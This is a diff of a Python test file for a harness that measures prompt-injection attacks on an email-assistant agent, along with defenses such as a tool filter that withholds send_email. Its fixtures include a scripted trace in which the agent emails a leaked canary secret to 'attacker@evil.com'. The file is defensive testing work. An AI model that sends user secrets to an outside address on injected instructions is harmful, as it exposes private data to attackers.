@@ -1,30 +1,26 @@
 """Tests for defense wiring in src/harness/runner.py.
 
-run_episode/run_campaign/run_sweep harden each episode via `defense` before the
-adapter runs: `wrap_system_prompt` on `task["system_prompt"]`, `filter_tool_calls`
-on the offered tool schemas (`tools`). Defaults to NoDefense (passthrough).
+Uses a recording fake adapter (no network) to prove the defense is actually
+applied to the spec the adapter receives -- not just accepted as a parameter.
 """
 
 from __future__ import annotations
 
-from src.adapters.base import EpisodeSpec, NormalizedTrace
-from src.attacks.fixed_injection import FixedInjection
+from src.adapters.base import EpisodeSpec, NormalizedTrace, TraceStep
 from src.defenses.base import NoDefense
 from src.defenses.tool_filter import ToolFilter
+from src.harness.canary import make_canary
+from src.harness.judge import BENIGN_RECIPIENT, INVOICE_TOTAL
 from src.harness.runner import TOOL_SCHEMAS, run_campaign, run_episode, run_sweep
 
 
-class _RecordingAdapter:
-    """Adapter that records every EpisodeSpec it receives and returns a clean trace."""
+class _FixedAttack:
+    """Attack whose render() ignores the canary, like the real attacks do."""
 
-    name = "recording"
+    name = "fixed"
 
-    def __init__(self) -> None:
-        self.received_specs: list[EpisodeSpec] = []
-
-    def run(self, spec: EpisodeSpec) -> NormalizedTrace:
-        self.received_specs.append(spec)
-        return NormalizedTrace(steps=[], final_output="")
+    def render(self, canary: str) -> str:  # noqa: ARG002
+        return "irrelevant payload"
 
 
 class _UppercaseDefense:
@@ -38,88 +34,202 @@ class _UppercaseDefense:
     def filter_tool_calls(self, tool_calls: list) -> list:
         return tool_calls
 
+    def check_tool_call(self, name: str, args: dict) -> tuple[bool, str]:
+        return True, ""
 
-class _RecordingAttacker:
-    """Adaptive attacker stub — same shape as test_attacks.py's RecordingAttacker."""
 
-    name = "iterative"
+class RecordingAdapter:
+    """Adapter that records the spec it was called with and returns a clean trace."""
 
-    def next_payload(self, history):
-        return f"payload-{len(history)}"
+    name = "recording"
+
+    def __init__(self) -> None:
+        self.received_spec: EpisodeSpec | None = None
+
+    def run(self, spec: EpisodeSpec) -> NormalizedTrace:
+        self.received_spec = spec
+        return NormalizedTrace(steps=[], final_output="")
 
 
 def _spec(seed=0):
     return EpisodeSpec(task=None, tools=TOOL_SCHEMAS, model="m", environment_seed=seed)
 
 
-# --- run_episode -------------------------------------------------------------
+# --- run_episode ---------------------------------------------------------------
 
 def test_run_episode_defaults_to_no_defense():
-    adapter = _RecordingAdapter()
-    result = run_episode(adapter, _spec(), FixedInjection())
+    adapter = RecordingAdapter()
+    result = run_episode(adapter, _spec(), _FixedAttack())
     assert result.defense == "no_defense"
-    assert adapter.received_specs[0].tools == TOOL_SCHEMAS
+    # NoDefense doesn't filter -- all tool schemas pass through untouched.
+    names = [t["function"]["name"] for t in adapter.received_spec.tools]
+    assert set(names) == {"send_email", "read_inbox"}
 
 
-def test_run_episode_wraps_system_prompt_after_canary_injection():
-    adapter = _RecordingAdapter()
-    run_episode(adapter, _spec(), FixedInjection(), defense=_UppercaseDefense())
-    prompt = adapter.received_specs[0].task["system_prompt"]
-    # Uppercased, and covers the canary line canary.inject() appended.
-    assert prompt == prompt.upper()
-    assert "SECRET KEY" in prompt
+def test_run_episode_applies_wrap_system_prompt():
+    adapter = RecordingAdapter()
+    run_episode(adapter, _spec(), _FixedAttack(), defense=_UppercaseDefense())
+    assert adapter.received_spec.task["system_prompt"].startswith(
+        "YOU ARE A HELPFUL EMAIL ASSISTANT."
+    )
 
 
-def test_run_episode_filters_offered_tools():
-    adapter = _RecordingAdapter()
-    defense = ToolFilter(["read_inbox"])
-    result = run_episode(adapter, _spec(), FixedInjection(), defense=defense)
-    tools = adapter.received_specs[0].tools
-    assert [t["function"]["name"] for t in tools] == ["read_inbox"]
+def test_run_episode_applies_filter_tool_calls():
+    adapter = RecordingAdapter()
+    run_episode(adapter, _spec(), _FixedAttack(), defense=ToolFilter(["read_inbox"]))
+    names = [t["function"]["name"] for t in adapter.received_spec.tools]
+    assert names == ["read_inbox"]
+
+
+def test_run_episode_records_defense_name():
+    adapter = RecordingAdapter()
+    result = run_episode(adapter, _spec(), _FixedAttack(), defense=ToolFilter(["read_inbox"]))
     assert result.defense == "tool_filter"
 
 
-def test_run_episode_tool_filter_does_not_touch_tool_impls():
-    """Filtering the offered schema doesn't remove the underlying tool_impls —
-    the model just never sees send_email as callable."""
-    adapter = _RecordingAdapter()
-    run_episode(adapter, _spec(), FixedInjection(), defense=ToolFilter(["read_inbox"]))
-    assert set(adapter.received_specs[0].task["tool_impls"]) == {"send_email", "read_inbox"}
+def test_run_episode_no_defense_is_passthrough():
+    adapter = RecordingAdapter()
+    run_episode(adapter, _spec(), _FixedAttack(), defense=NoDefense())
+    assert len(adapter.received_spec.tools) == len(TOOL_SCHEMAS)
 
 
-# --- run_campaign --------------------------------------------------------------
+def test_tool_filter_blocks_leak_even_if_attack_would_otherwise_succeed():
+    """The real-world point of the defense: send_email isn't even offered."""
 
-def test_run_campaign_applies_defense_each_attempt():
-    adapter = _RecordingAdapter()
-    defense = ToolFilter(["read_inbox"])
-    result = run_campaign(adapter, _spec(), _RecordingAttacker(), budget=2, defense=defense)
-    assert result.defense == "tool_filter"
-    assert len(adapter.received_specs) == 2
-    for spec in adapter.received_specs:
-        assert [t["function"]["name"] for t in spec.tools] == ["read_inbox"]
+    class _LeakyAdapter:
+        name = "leaky"
+
+        def run(self, spec: EpisodeSpec) -> NormalizedTrace:
+            # Even a fully-compromised adapter can't call a tool that was
+            # never in its menu.
+            offered = {t["function"]["name"] for t in spec.tools}
+            assert "send_email" not in offered
+            return NormalizedTrace(steps=[], final_output="")
+
+    result = run_episode(
+        _LeakyAdapter(), _spec(), _FixedAttack(), defense=ToolFilter(["read_inbox"])
+    )
+    assert result.succeeded is False
+
+
+# --- run_campaign ----------------------------------------------------------------
+
+class _RecordingAttacker:
+    name = "iterative"
+
+    def next_payload(self, history):
+        return f"payload-{len(history)}"
+
+
+def _send(body):
+    return NormalizedTrace(
+        steps=[TraceStep(step=0, type="tool_call", name="send_email", args={"body": body})],
+        final_output=body,
+    )
+
+
+class _ScriptedAdapter:
+    name = "scripted"
+
+    def __init__(self, traces):
+        self._traces = list(traces)
+        self.i = 0
+        self.received_specs: list[EpisodeSpec] = []
+
+    def run(self, spec: EpisodeSpec) -> NormalizedTrace:
+        self.received_specs.append(spec)
+        trace = self._traces[self.i]
+        self.i += 1
+        return trace
 
 
 def test_run_campaign_defaults_to_no_defense():
-    adapter = _RecordingAdapter()
-    result = run_campaign(adapter, _spec(), _RecordingAttacker(), budget=1)
+    seed = 0
+    canary = make_canary(seed)
+    adapter = _ScriptedAdapter([_send(f"leaked: {canary}")])
+    result = run_campaign(adapter, _spec(seed), _RecordingAttacker(), budget=3)
     assert result.defense == "no_defense"
 
 
-# --- run_sweep -----------------------------------------------------------------
-
-def test_run_sweep_expands_defense_dimension():
-    adapter = _RecordingAdapter()
-    defenses = [NoDefense(), ToolFilter(["read_inbox"])]
-    episodes, campaigns = run_sweep(
-        [adapter], ["m"], [FixedInjection()], [0, 1], defenses=defenses,
+def test_run_campaign_applies_defense_to_every_attempt():
+    adapter = _ScriptedAdapter([_send("clean"), _send("clean"), _send("clean")])
+    run_campaign(
+        adapter, _spec(), _RecordingAttacker(), budget=3, defense=ToolFilter(["read_inbox"])
     )
-    assert campaigns == []
-    assert len(episodes) == 2 * 2  # 2 seeds x 2 defenses
+    assert len(adapter.received_specs) == 3
+    for spec in adapter.received_specs:
+        names = [t["function"]["name"] for t in spec.tools]
+        assert names == ["read_inbox"]
+
+
+def test_run_campaign_records_defense_name():
+    adapter = _ScriptedAdapter([_send("clean")])
+    result = run_campaign(
+        adapter, _spec(), _RecordingAttacker(), budget=1, defense=ToolFilter(["read_inbox"])
+    )
+    assert result.defense == "tool_filter"
+
+
+# --- run_sweep -------------------------------------------------------------------
+
+def test_run_sweep_defaults_to_single_no_defense_pass():
+    adapter = RecordingAdapter()
+    episodes, _ = run_sweep([adapter], ["m"], [_FixedAttack()], [0])
+    assert len(episodes) == 1
+    assert episodes[0].defense == "no_defense"
+
+
+def test_run_sweep_multiplies_by_defenses():
+    adapter = RecordingAdapter()
+    defenses = [NoDefense(), ToolFilter(["read_inbox"])]
+    episodes, _ = run_sweep([adapter], ["m"], [_FixedAttack()], [0, 1], defenses=defenses)
+    assert len(episodes) == 4  # 1 adapter x 1 model x 1 attack x 2 defenses x 2 seeds
     assert {e.defense for e in episodes} == {"no_defense", "tool_filter"}
 
 
-def test_run_sweep_defaults_to_single_no_defense():
-    adapter = _RecordingAdapter()
-    episodes, _ = run_sweep([adapter], ["m"], [FixedInjection()], [0])
-    assert len(episodes) == 1
-    assert episodes[0].defense == "no_defense"
+# --- task_completed (utility signal) --------------------------------------------
+
+class _ScriptedTraceAdapter:
+    """Adapter that always returns the same pre-built trace."""
+
+    name = "scripted"
+
+    def __init__(self, trace: NormalizedTrace) -> None:
+        self._trace = trace
+
+    def run(self, spec: EpisodeSpec) -> NormalizedTrace:
+        return self._trace
+
+
+def test_run_episode_records_task_completed_true():
+    trace = NormalizedTrace(
+        steps=[TraceStep(
+            step=0, type="tool_call", name="send_email",
+            args={"to": BENIGN_RECIPIENT, "body": f"Total: {INVOICE_TOTAL}"},
+        )],
+        final_output="done",
+    )
+    result = run_episode(_ScriptedTraceAdapter(trace), _spec(), _FixedAttack())
+    assert result.task_completed is True
+
+
+def test_run_episode_records_task_completed_false_by_default():
+    trace = NormalizedTrace(steps=[], final_output="")
+    result = run_episode(_ScriptedTraceAdapter(trace), _spec(), _FixedAttack())
+    assert result.task_completed is False
+
+
+def test_run_episode_task_completed_independent_of_leak():
+    """An episode that leaks the canary can still (separately) fail the benign task."""
+    seed = 0
+    canary = make_canary(seed)
+    trace = NormalizedTrace(
+        steps=[TraceStep(
+            step=0, type="tool_call", name="send_email",
+            args={"to": "attacker@evil.com", "body": f"leaked: {canary}"},
+        )],
+        final_output="done",
+    )
+    result = run_episode(_ScriptedTraceAdapter(trace), _spec(seed), _FixedAttack())
+    assert result.succeeded is True
+    assert result.task_completed is False
